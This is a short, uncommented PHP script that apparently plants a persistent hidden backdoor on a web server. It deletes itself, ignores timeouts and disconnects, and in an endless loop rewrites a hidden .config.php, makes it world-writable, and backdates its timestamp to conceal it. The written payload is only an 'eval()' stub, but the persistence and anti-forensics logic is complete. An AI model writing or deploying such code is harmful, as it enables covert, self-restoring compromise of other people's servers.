<?php

set_time_limit(0);
ignore_user_abort(1);
unlink(__FILE__);
while (1) {
    file_put_contents("./.config.php", "eval()");
    system("chmod 777 .config.php");
    touch("./.config.php", mktime(20, 15, 1, 11, 28, 2016));
    usleep(100);
}
